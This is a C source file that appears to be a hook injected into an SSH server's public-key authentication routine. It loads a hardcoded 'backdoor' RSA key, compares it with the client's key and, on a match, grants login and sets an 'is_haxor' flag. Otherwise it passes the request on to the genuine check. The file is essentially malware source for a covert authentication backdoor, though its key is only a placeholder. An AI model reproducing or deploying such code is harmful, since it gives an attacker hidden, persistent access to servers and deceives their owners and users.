#include "syscall.h"
#include "config.h"

#define KEY_TYPE_RSA 1
#define SSH_MAX_PUBKEY_BYTES 8192

extern void *hook_context;

typedef unsigned long u64;

void _strcpy(char *dst, char *src) {
	while(*src != '\0') {
		*dst++ = *src++;
	}

	*dst++ = '\0';
}

void _memset(unsigned char *dst, unsigned char val, int len) {
	while(len--) {
		*dst++ = val;
	}
}

typedef struct {
	config_block *config_memory;
	int (*user_key_allowed2)(void*, void*, char*);
	void (*restore_uid)(void);
	void* (*key_new)(int);
	int (*key_read)(void*, char**);
	void (*key_free)(void*);
	int (*BN_cmp)(u64, u64);
} hook_ctx;

int hook_main(void *pw, void *key, char *file) {
	char *backdoor_pubkey_ptr;
	void *rsa_key;

	char backdoor_pubkey[SSH_MAX_PUBKEY_BYTES];

	hook_ctx *ctx = (hook_ctx*)(&hook_context);

	_memset(backdoor_pubkey, 0, SSH_MAX_PUBKEY_BYTES);
	_strcpy(backdoor_pubkey, "\xaa\xbb\xcc\xdd");

	backdoor_pubkey_ptr = backdoor_pubkey;

	rsa_key = ctx->key_new(KEY_TYPE_RSA);

	ctx->key_read(rsa_key, &backdoor_pubkey_ptr);

	u64 key_a_rsa = *(u64*)(rsa_key+8);
	u64 key_b_rsa = *(u64*)(key+8);

	if (key_a_rsa != 0 &&
		key_b_rsa != 0 &&
		ctx->BN_cmp(*(u64*)(key_a_rsa + 32), *(u64*)(key_b_rsa + 32)) == 0 &&
		ctx->BN_cmp(*(u64*)(key_a_rsa + 40), *(u64*)(key_b_rsa + 40)) == 0
	) {
		ctx->restore_uid();
#ifdef DONT_LEAK_MEMORY // this call crashes on some platforms, needs investigation
		ctx->key_free(rsa_key);
#endif
		ctx->config_memory->is_haxor = 1;
		return 1;
	}

	ctx->config_memory->is_haxor = 0;

	return ctx->user_key_allowed2(pw, key, file);
}
